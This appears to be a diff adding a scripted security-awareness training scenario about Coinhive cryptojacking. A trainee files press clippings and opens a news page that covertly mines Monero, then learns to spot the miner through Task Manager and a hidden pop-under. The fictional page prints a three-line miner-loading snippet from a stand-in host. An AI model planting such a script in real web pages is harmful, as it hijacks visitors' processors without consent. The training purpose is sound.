@@ -1,0 +1,224 @@
+# Coinhive cryptojacking (2017-2019). Web pages mined cryptocurrency with the visitor's processor.
+# A quest (QUESTS.md): the trainee files news clippings for a press digest, does one safely, then reads a story on a page that is mining.
+# The victim is invented: Coinhive hit anyone who opened a page with the script in it, which is exactly why nobody noticed. The papers here are fictional.
+os windows
+user Dana Okafor
+about
+  | Coinhive was a script that website owners could add to a page to mine Monero, a cryptocurrency, with the processor of everyone who visited. Used openly and with a visitor's consent, it was a way to earn money without adverts. Hidden in a page, it was cryptojacking: no download, no question and no warning, only a processor running flat out for as long as the tab stayed open.
+  | In 2018 a hacked plugin put the script on thousands of sites, including government sites. Dana's job in this training is invented: the script hit anyone who opened such a page, not one profession.
+story
+  | You are Dana Okafor, communications assistant at Northwind Traders. Every day you collect news stories that mention the company and file each one as a clipping in the press digest your manager reads at five.
+  | It is mid-afternoon. You have filed 8 of today's 10 clippings. Two to go.
+  | You read every story in the browser on your laptop. It is a few years old, but quiet: the fan hardly ever spins up. Remember how it feels.
+quota 8 10 Clippings filed today
+
+# The safe task: a story in the paper's own address, a button to file it, and a quiet laptop.
+page filed-9 start.northwind.example/press-digest/clipping-9/filed
+  title Clipping filed
+  brand Northwind press digest
+  heading Clipping filed
+  | “Northwind Traders opens harbour-side warehouse” is in today's press digest.
+page skipped-9 start.northwind.example/press-digest/clipping-9/skipped
+  title Clipping skipped
+  brand Northwind press digest
+  heading Clipping skipped
+  | You can come back to this story later.
+page gaz-9 harbour-gazette.example/business/northwind-warehouse
+  title Northwind Traders opens harbour-side warehouse
+  brand Harbour Gazette
+  favorite
+  heading Northwind Traders opens harbour-side warehouse
+  | The tea and kitchenware seller has taken over the old net store at Pier 4, doubling the space it ships from. The first orders went out on Monday, and 14 jobs are planned by spring.
+  | “We outgrew the old unit in two winters,” the company's managing director told the Gazette. “Pier 4 gives us room for the whole range under one roof.”
+  | The council welcomed the move. The old net store had stood empty for six years, and the harbour trust says two more units on the pier are now being viewed.
+  | Harbour Gazette, 6 November 2026.
+  button File this clipping -> filed-9
+  button Skip for now -> skipped-9
+mail clip-9
+  from Priya Shah <priya.shah@northwind.example>
+  subject Clipping 9: Harbour Gazette on the new warehouse
+  link gaz-9
+  sent 2026-11-09 14:40
+  | Hi Dana,
+  |
+  | The Gazette has written up the new warehouse. The link goes straight to the story. Please file it for the digest.
+  |
+  | Priya
+
+step Clipping 9 of 10
+  look Mail: Priya's message with the news link
+  | A new story has come in from Priya, in Communications. It is an ordinary news story. File it the normal way, so you know what normal looks like.
+notify mail Priya Shah
+  | Clipping 9: Harbour Gazette on the new warehouse
+
+step The link goes to the paper
+  look the link under Priya's message
+  when mail clip-9
+  | The email links to the paper's own address, harbour-gazette.example. Hover over a link before you click it, to check where it goes.
+open clip-9
+
+step Read the story
+  look the story, and the button under it
+  when visit gaz-9
+  move Read the story, then click “File this clipping”.
+  | A news story on a paper's site. The page loads, you read it and nothing else happens. The laptop stays as quiet as it was.
+open gaz-9
+
+step Filed: 9 of 10
+  look the counter in the guide: nine of ten
+  when choose gaz-9 any
+  | Filed, nine of ten. The clipping is in the digest, on the company's own page.
+  | Another message has just arrived.
+choose gaz-9 1
+quota +1
+run Tab: Harbour Gazette
+  publisher Microsoft Corporation
+  trusted yes
+  cpu 2
+  mem 90
+
+# The lure: a second write-up of the same story, on a small paper whose page carries the mining script.
+page start-10 start.northwind.example/press-digest
+  title Press digest
+  brand Northwind Traders
+  heading Press digest
+  | 10 of 10 clippings filed for 9 November 2026. The digest goes to your manager at five.
+page filed-10 start.northwind.example/press-digest/clipping-10/filed
+  title Clipping filed
+  brand Northwind press digest
+  heading Clipping filed
+  | “Northwind opens warehouse on the old net store” is in today's press digest.
+  button Back to the digest -> start-10
+page skipped-10 start.northwind.example/press-digest/clipping-10/skipped
+  title Clipping skipped
+  brand Northwind press digest
+  heading Clipping skipped
+  | You can come back to this story later.
+page courier-10 coastal-courier.example/news/northwind-harbour-warehouse
+  title Northwind opens warehouse on the old net store
+  brand Coastal Courier
+  heading Northwind opens warehouse on the old net store
+  | Northwind Traders has moved its stock to Pier 4, where the old net store stood empty for six years. The company says the first orders left on Monday and 14 people will be hired by spring.
+  | “We outgrew the old unit in two winters,” the managing director said. “Pier 4 gives us room for the whole range under one roof.”
+  | The council welcomed the move, and the harbour trust says two more units on the pier are now being viewed.
+  | Coastal Courier, 7 November 2026.
+  section Hidden in the page (visitors never see this)
+  tone injected
+  code <script src="https://coinhive.example/lib/coinhive.min.js"></script>
+  code var miner = new CoinHive.Anonymous('SITE-KEY-EXAMPLE');
+  code miner.start();
+  note The script mines Monero for whoever put it on the page, often an attacker who hacked the site, with the visitor's processor for as long as the tab is open. It is shown here for training only.
+  button File this clipping -> filed-10
+  button Skip for now -> skipped-10
+mail clip-10
+  from Marcus Lee <marcus.lee@northwind.example>
+  subject Clipping 10: Coastal Courier on the warehouse
+  link courier-10
+  sent 2026-11-09 15:05
+  | Hi Dana,
+  |
+  | I found a second write-up in a smaller local paper. The link opens the story. Please file it as the last clipping for today.
+  |
+  | Marcus
+notify mail Marcus Lee
+  | Clipping 10: Coastal Courier on the warehouse
+
+step The last clipping
+  look Mail: Marcus's message with the second link
+  when mail clip-10
+  | Marcus found a second write-up in a smaller paper. It is the same job, with the same kind of link as before. Open the story.
+open clip-10
+
+step The same job on another site
+  look the story, and the panel under it
+  when visit courier-10
+  move Open {Task Manager|Activity Monitor}: click the glowing ⚙ chip under this step.
+  | The page looks just like the last one. Nothing on it asks you for anything, but the fan starts to spin up.
+  | The panel under the story is shown for training only. A real visitor sees the story and nothing else.
+block 203.0.113.80 443
+run Tab: Coastal Courier
+  publisher Microsoft Corporation
+  trusted yes
+  cpu 60
+  mem 410
+run Tab: Coastal Courier (pop-under)
+  publisher Microsoft Corporation
+  trusted yes
+  cpu 40
+  mem 160
+open courier-10
+
+step Task Manager: a loud laptop
+  look {Task Manager|Activity Monitor}: the two Coastal Courier rows, signed by the browser's maker but using almost all of the processor
+  when open taskmanager
+  move Go back to the story and click “File this clipping”.
+  | The fan is loud and the laptop is hot. In the process list the Coastal Courier tab and its small window use almost all of the processor, where the Harbour Gazette tab used almost nothing.
+  | There is a second Coastal Courier row as well.
+open taskmanager
+
+step Filed: 10 of 10
+  look the counter in the guide: the shift is done
+  when choose courier-10 any
+  | Filed, ten of ten. The shift is done, and nothing on the page said anything was wrong.
+choose courier-10 1
+quota +1
+
+# The pop-under: a plain small window the page opened when it loaded. It was behind the browser until now.
+step Back to the digest, the heat stays
+  look the small Coastal Courier window, and its row in Task Manager
+  when choose filed-10 1
+  | Going back to the digest closes the article, but the fan does not slow down.
+  | The small Coastal Courier window the page opened when it loaded is still there, and it is still mining. The process list shows it as a second tab, still busy.
+choose filed-10 1
+view popunder panel
+  title Coastal Courier
+  app Browser
+  publisher Microsoft Corporation
+  size 320x200
+  icon web
+  heading Advertisement
+  button Close the window -> done primary
+run Tab: Coastal Courier
+  publisher Microsoft Corporation
+  trusted yes
+  cpu 0
+  mem 20
+show popunder
+
+step Close the little window
+  look {Task Manager|Activity Monitor}: the processor drops to a few percent
+  when done popunder
+  | Closing the hidden window ends the mining, and the processor drops at once. Nothing was installed and none of your files were touched.
+run Tab: Coastal Courier (pop-under)
+  publisher Microsoft Corporation
+  trusted yes
+  cpu 0
+  mem 20
+open taskmanager
+
+step What the script earned
+  look the animation: your processor worked for whoever planted the script
+  | While the story was open, the script solved small sums for a mining pool and sent each answer back. The coins went to whoever put the script on the page, often an attacker who hacked the site.
+  | A visitor who stayed ten minutes earned them a fraction of a cent. Thousands of visitors earned a lot, and the laptop paid for the power and the wear.
+attack botnet-ddos
+  | A hidden script starts in the page
+  | Your processor solves sums for a mining pool
+  | Monero goes to whoever planted the script
+  | You pay for the power and the wear
+block 203.0.113.81 443
+
+flag hard page courier-10
+  | A normal-looking news page with a script hidden in it. It mined with your processor and asked nobody.
+flag hard process Tab: Coastal Courier
+  | The tab that ran the script: almost all of the processor, for a page you only read.
+flag hard process Tab: Coastal Courier (pop-under)
+  | A hidden window the page opened by itself. It kept mining after the story was closed.
+flag hard notice taskmanager 203.0.113.80
+  | The page tried to reach a mining pool to send its work back.
+flag soft section courier-10 1
+  | A training aid: on a real page the script cannot be seen. Only the hot, loud laptop gives it away.
+
+lesson
+  | A hot, loud, slow computer with one busy browser tab is a sign. Open Task Manager (Activity Monitor on a Mac), find the tab using the processor, close it, and look for a small hidden window.
+  | Nothing was downloaded, so there was nothing for antivirus to catch. The page itself was the attack, and the site might have been honest and hacked.
+  | Keep the browser up to date and use a content blocker: they stop most mining scripts before they start. Coinhive shut down in March 2019, but mining scripts like it still turn up.
